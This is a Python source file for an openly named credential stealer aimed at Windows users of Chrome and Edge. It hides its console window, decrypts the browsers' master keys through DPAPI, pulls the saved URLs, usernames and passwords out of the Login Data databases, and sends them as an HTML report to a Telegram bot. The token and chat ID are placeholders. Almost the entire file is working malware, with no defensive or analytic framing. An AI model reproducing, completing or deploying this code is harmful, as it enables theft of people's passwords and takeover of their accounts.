import os
import sys
import json
import base64
import sqlite3
import shutil
import tempfile
import requests
import threading
import ctypes
from datetime import datetime
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import win32crypt

# drop token and id chat here 
BOT_TOKEN = "..............................................."
CHAT_ID = "................"

class Stealer:
    def __init__(self):
        self.temp_dir = tempfile.mkdtemp()
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
        self.interval = 1800  # 30 
        self.master_keys = {
            "Chrome": self.get_chrome_master_key(),
            "Edge": self.get_edge_master_key()
        }

    def _hide_console(self):
        # hidd
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    def get_chrome_master_key(self):
        try:
            path = os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data", "Local State")
            with open(path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
            encrypted_key_with_prefix = base64.b64decode(encrypted_key_b64)
            encrypted_key = encrypted_key_with_prefix[5:]  # 666 DPAPI
            master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return master_key
        except Exception:
            return None

    def get_edge_master_key(self):
        try:
            path = os.path.join(os.environ["LOCALAPPDATA"], "Microsoft", "Edge", "User Data", "Local State")
            with open(path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
            encrypted_key_with_prefix = base64.b64decode(encrypted_key_b64)
            encrypted_key = encrypted_key_with_prefix[5:]  # 666 DPAPI
            master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return master_key
        except Exception:
            return None

    def decrypt_password(self, encrypted_password, master_key):
        try:
            if encrypted_password[:3] == b'v10':  # Chrome / Edge AES-GCM
                iv = encrypted_password[3:15]
                payload = encrypted_password[15:-16]
                tag = encrypted_password[-16:]
                cipher = Cipher(algorithms.AES(master_key), modes.GCM(iv, tag), backend=default_backend())
                decryptor = cipher.decryptor()
                decrypted_pass = decryptor.update(payload) + decryptor.finalize()
                return decrypted_pass.decode()
            else:
                # DPAPI 666
                return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
        except Exception:
            return ""

    def extract_passwords(self, browser_name, user_data_path):
        results = []
        master_key = self.master_keys.get(browser_name)
        login_db_path = os.path.join(user_data_path, "Default", "Login Data")
        if not os.path.exists(login_db_path):
            return results
        try:
            temp_db = os.path.join(self.temp_dir, f"{browser_name}_LoginData.db")
            shutil.copy2(login_db_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for origin_url, username, encrypted_password in cursor.fetchall():
                decrypted_password = self.decrypt_password(encrypted_password, master_key) if master_key else ""
                if username or decrypted_password:
                    results.append({
                        "url": origin_url,
                        "username": username,
                        "password": decrypted_password
                    })
            cursor.close()
            conn.close()
            os.remove(temp_db)
        except Exception:
            pass
        return results

    def generate_html_report(self, chrome_passwords, edge_passwords):
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        html = f"""
        <html>
        <head><title>Passwords Report</title></head>
        <body>
        <h2>Passwords Report - {now}</h2>
        <h3>Chrome Passwords ({len(chrome_passwords)})</h3>
        <table border="1" cellspacing="0" cellpadding="5">
            <tr><th>URL</th><th>Username</th><th>Password</th></tr>
        """
        for entry in chrome_passwords:
            html += f"<tr><td>{entry['url']}</td><td>{entry['username']}</td><td>{entry['password']}</td></tr>"
        html += "</table>"

        html += f"<h3>Edge Passwords ({len(edge_passwords)})</h3>"
        html += """
        <table border="1" cellspacing="0" cellpadding="5">
            <tr><th>URL</th><th>Username</th><th>Password</th></tr>
        """
        for entry in edge_passwords:
            html += f"<tr><td>{entry['url']}</td><td>{entry['username']}</td><td>{entry['password']}</td></tr>"
        html += "</table></body></html>"
        return html

    def send_report(self, html_report):
        try:
            # 666
            summary_msg = f"📡 Passwords report generated at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            self.session.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                data={"chat_id": CHAT_ID, "text": summary_msg}
            )

            # 666 HTML
            temp_file = os.path.join(self.temp_dir, "report.html")
            with open(temp_file, "w", encoding="utf-8") as f:
                f.write(html_report)

            with open(temp_file, "rb") as f:
                self.session.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                    data={"chat_id": CHAT_ID},
                    files={"document": ("report.html", f, "text/html")}
                )
            os.remove(temp_file)
        except Exception:
            pass

    def run(self):
        self._hide_console()
        chrome_path = os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data")
        edge_path = os.path.join(os.environ["LOCALAPPDATA"], "Microsoft", "Edge", "User Data")

        chrome_passwords = self.extract_passwords("Chrome", chrome_path)
        edge_passwords = self.extract_passwords("Edge", edge_path)

        html_report = self.generate_html_report(chrome_passwords, edge_passwords)
        self.send_report(html_report)

if __name__ == "__main__":
    stealer = Stealer()
    stealer.run()
